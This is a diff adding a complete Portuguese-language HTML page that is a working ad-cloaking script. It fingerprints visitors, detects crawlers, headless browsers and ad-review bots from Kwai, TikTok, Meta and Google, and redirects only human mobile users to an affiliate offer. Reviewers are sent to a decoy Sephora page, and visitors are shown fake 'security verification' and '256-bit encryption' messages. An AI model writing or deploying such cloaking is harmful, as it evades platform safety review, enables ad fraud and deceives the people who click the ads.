@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificando acesso...</title>
+  
+  <!-- ============================================================
+  DETECÇÃO E TELA DE CARREGAMENTO
+  ============================================================ -->
+  <script>
+    // ============================================================
+    // CONFIGURAÇÕES
+    // ============================================================
+    
+    const OFFER_URL = "https://apextry.com/go/kwai18";
+    const DECOY_URL = "https://www.sephora.com.br/cabelos/";
+    const LOADING_TIME = 3000; // 3 segundos
+    
+    // ============================================================
+    // FUNÇÕES DE DETECÇÃO
+    // ============================================================
+    
+    function isMobileDevice() {
+      const ua = navigator.userAgent.toLowerCase();
+      
+      const mobileKeywords = [
+        'android', 'iphone', 'ipod', 'ipad', 
+        'windows phone', 'mobile', 'blackberry', 
+        'opera mini', 'opera mobi', 'iemobile'
+      ];
+      
+      for (let kw of mobileKeywords) {
+        if (ua.includes(kw)) return true;
+      }
+      
+      if (ua.includes('ipad') || (ua.includes('macintosh') && 'ontouchstart' in window)) {
+        return true;
+      }
+      
+      if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
+        const desktopUA = ['windows nt', 'mac os x', 'linux x86'];
+        let isDesktopUA = false;
+        for (let os of desktopUA) {
+          if (ua.includes(os)) isDesktopUA = true;
+        }
+        if (!isDesktopUA) return true;
+      }
+      
+      return false;
+    }
+    
+    function isBotUserAgent() {
+      const ua = navigator.userAgent.toLowerCase();
+      
+      const botsPatterns = [
+        'googlebot', 'google-inspectiontool', 'google favicon',
+        'facebookexternalhit', 'facebot', 'meta-externalagent', 'meta-inspector', 'meta-reviewer',
+        'twitterbot', 'linkedinbot', 'slackbot', 'discordbot',
+        'telegrambot', 'whatsapp', 'baiduspider', 'yandexbot',
+        'bingbot', 'duckduckbot', 'applebot', 'rogerbot',
+        'ahrefsbot', 'semrushbot', 'mj12bot', 'dotbot',
+        'petalbot', 'pinterest', 'redditbot', 'tumblr',
+        'mediapartners-google', 'adsbot-google', 'google-read-aloud',
+        'headless', 'phantomjs', 'selenium', 'puppeteer',
+        'crawler', 'spider', 'scraper', 'bot/', 'crawl',
+        'kwai', 'tiktok', 'bytebot', 'bytedance', 'douyin',
+        'facebook', 'instagram', 'meta-external',
+        'snapchat', 'pinterest', 'reddit',
+        'ad preview', 'advalidator', 'adchecker',
+        'brand safety', 'ad verification', 'ias',
+        'doubleclick', 'googleads', 'google-ads',
+        'outbrain', 'taboola', 'mgid', 'revcontent',
+        'whatsapp', 'telegram', 'line', 'viber'
+      ];
+      
+      for (let pattern of botsPatterns) {
+        if (ua.includes(pattern)) {
+          return true;
+        }
+      }
+      
+      return false;
+    }
+    
+    function isHeadless() {
+      if (navigator.webdriver === true) return true;
+      if (navigator.userAgent.includes('HeadlessChrome')) return true;
+      if (navigator.userAgent.includes('PhantomJS')) return true;
+      return false;
+    }
+    
+    function isAdVerifier() {
+      const params = new URLSearchParams(window.location.search);
+      
+      const adParams = ['__ad__', '__adid__', '__cmpn__', '__creative__', 'ad_preview', 'ad_test'];
+      for (let p of adParams) {
+        if (params.has(p)) return true;
+      }
+      
+      if (params.has('kwai_click_id') && params.get('kwai_click_id') === '__CALLBACK__') {
+        return true;
+      }
+      
+      return false;
+    }
+    
+    function isFastLoad() {
+      if (performance && performance.timing) {
+        const loadTime = performance.timing.loadEventEnd - performance.timing.navigationStart;
+        return loadTime < 50;
+      }
+      return false;
+    }
+    
+    function isLocalStorageBlocked() {
+      try {
+        localStorage.setItem('test_cloak', '1');
+        localStorage.removeItem('test_cloak');
+        return false;
+      } catch(e) {
+        return true;
+      }
+    }
+    
+    function isSuspiciousResolution() {
+      const width = window.screen.width;
+      const height = window.screen.height;
+      
+      const suspicious = [
+        [1024, 768], [800, 600], [1280, 720], [1366, 768], [1920, 1080]
+      ];
+      
+      for (let res of suspicious) {
+        if (width === res[0] && height === res[1]) return true;
+      }
+      
+      return false;
+    }
+    
+    // ============================================================
+    // CAPTURA DE PARÂMETROS
+    // ============================================================
+    
+    function captureParams() {
+      var urlParams = new URLSearchParams(window.location.search);
+      
+      var paramKeys = [
+        'utm_source', 'utm_medium', 'utm_campaign',
+        'utm_content', 'utm_term', 'utm_id',
+        'fbclid', 'gclid', 'click_id', 'kwai_click_id',
+        'msclkid', 'ttclid', '_fbp', '_fbc',
+        'kwai_id', 'kwai_campaign', 'kwai_adset', 'kwai_ad',
+        'sck', 'xcod', 'cv', 'salesCode',
+        'source', 'medium', 'campaign', 'content', 'term',
+        'apx', 'pixel_id'
+      ];
+      
+      var capturedParams = {};
+      
+      paramKeys.forEach(function(key) {
+        var value = urlParams.get(key);
+        if (value) {
+          capturedParams[key] = value;
+        }
+      });
+      
+      if (capturedParams.utm_content) {
+        var parts = capturedParams.utm_content.split('::');
+        if (parts.length === 3) {
+          if (!capturedParams.pixel_id) {
+            capturedParams.pixel_id = parts[2];
+          }
+          if (!capturedParams.click_id && !capturedParams.kwai_click_id) {
+            capturedParams.click_id = parts[1];
+          }
+        }
+      }
+      
+      try {
+        var existing = JSON.parse(sessionStorage.getItem('pressel_utms') || '{}');
+        Object.keys(capturedParams).forEach(function(key) {
+          existing[key] = capturedParams[key];
+        });
+        sessionStorage.setItem('pressel_utms', JSON.stringify(existing));
+        capturedParams = existing;
+      } catch(e) {}
+      
+      return capturedParams;
+    }
+    
+    function buildRedirectUrl(baseUrl, params) {
+      try {
+        var url = new URL(baseUrl);
+        Object.keys(params).forEach(function(key) {
+          if (!url.searchParams.has(key)) {
+            url.searchParams.set(key, params[key]);
+          }
+        });
+        return url.toString();
+      } catch(e) {
+        return baseUrl;
+      }
+    }
+    
+    // ============================================================
+    // EXECUÇÃO PRINCIPAL
+    // ============================================================
+    
+    (function() {
+      // Captura parâmetros
+      var capturedParams = captureParams();
+      
+      // Avalia se é humano mobile
+      var isMobile = isMobileDevice();
+      var isBotUA = isBotUserAgent();
+      var isHeadlessBrowser = isHeadless();
+      var isAdVerifierBot = isAdVerifier();
+      var fastLoad = isFastLoad();
+      var localStorageBlocked = isLocalStorageBlocked();
+      var suspiciousRes = isSuspiciousResolution();
+      
+      var botScore = 0;
+      if (isBotUA) botScore += 3;
+      if (isHeadlessBrowser) botScore += 2;
+      if (isAdVerifierBot) botScore += 5;
+      if (fastLoad) botScore += 1;
+      if (localStorageBlocked) botScore += 1;
+      if (suspiciousRes) botScore += 1;
+      
+      var isHumanMobile = (isMobile && !isBotUA && !isAdVerifierBot && botScore < 3);
+      
+      // Salva a decisão para usar depois
+      window.__redirectDecision = {
+        isHumanMobile: isHumanMobile,
+        capturedParams: capturedParams
+      };
+      
+      // Atualiza a barra de progresso
+      var progressBar = document.getElementById('progressBar');
+      var statusText = document.getElementById('statusText');
+      var progress = 0;
+      
+      var interval = setInterval(function() {
+        progress += 2;
+        if (progress > 100) progress = 100;
+        if (progressBar) progressBar.style.width = progress + '%';
+        
+        if (progress >= 100) {
+          clearInterval(interval);
+          
+          // Redireciona após o tempo de carregamento
+          setTimeout(function() {
+            if (isHumanMobile) {
+              // Humano mobile → mostra a pressel
+              var offerWithParams = buildRedirectUrl(OFFER_URL, capturedParams);
+              window.location.href = offerWithParams;
+            } else {
+              // Desktop, bot ou verificador → white
+              var decoyWithParams = buildRedirectUrl(DECOY_URL, capturedParams);
+              window.location.replace(decoyWithParams);
+            }
+          }, 200);
+        }
+      }, 30); // Atualiza a cada 30ms (~3 segundos para 100%)
+      
+    })();
+  </script>
+  
+  <!-- ============================================================
+  ESTILO DA TELA DE CARREGAMENTO
+  ============================================================ -->
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      min-height: 100vh;
+      display: grid;
+      place-items: center;
+      font-family: Arial, Helvetica, sans-serif;
+      background: radial-gradient(circle at center, #0b1020, #050812);
+      color: #ffffff;
+      overflow: hidden;
+    }
+    
+    .loading-container {
+      text-align: center;
+      padding: 40px 30px;
+      max-width: 400px;
+      width: 100%;
+    }
+    
+    .spinner {
+      width: 60px;
+      height: 60px;
+      margin: 0 auto 30px;
+      border: 4px solid rgba(255,255,255,0.08);
+      border-top: 4px solid #7c3aed;
+      border-right: 4px solid #22c55e;
+      border-radius: 50%;
+      animation: spin 0.9s linear infinite;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    
+    h1 {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      color: #ffffff;
+    }
+    
+    .sub-text {
+      color: #8d98b5;
+      font-size: 15px;
+      margin-bottom: 30px;
+    }
+    
+    .progress-track {
+      width: 100%;
+      height: 6px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 10px;
+      overflow: hidden;
+      margin-bottom: 16px;
+    }
+    
+    .progress-bar {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #7c3aed, #22c55e);
+      border-radius: 10px;
+      transition: width 0.1s linear;
+    }
+    
+    .status-text {
+      font-size: 13px;
+      color: #6b7a9a;
+      letter-spacing: 0.5px;
+    }
+    
+    .status-text span {
+      color: #4fc3f7;
+    }
+    
+    .dots::after {
+      content: '';
+      animation: dots 1.2s steps(4, end) infinite;
+    }
+    
+    @keyframes dots {
+      0% { content: ''; }
+      25% { content: '.'; }
+      50% { content: '..'; }
+      75% { content: '...'; }
+      100% { content: ''; }
+    }
+    
+    .footer-loading {
+      margin-top: 30px;
+      font-size: 12px;
+      color: #3d4a6b;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ============================================================
+  TELA DE CARREGAMENTO (SEMPRE VISÍVEL INICIALMENTE)
+  ============================================================ -->
+  <div class="loading-container">
+    <div class="spinner"></div>
+    
+    <h1>Verificando acesso</h1>
+    <p class="sub-text">Aguarde enquanto validamos seu dispositivo<span class="dots"></span></p>
+    
+    <div class="progress-track">
+      <div class="progress-bar" id="progressBar"></div>
+    </div>
+    
+    <div class="status-text" id="statusText">
+      <span>🔒</span> Verificando segurança...
+    </div>
+    
+    <div class="footer-loading">
+      Conexão segura • 256-bit encryption
+    </div>
+  </div>
+
+</body>
+</html>
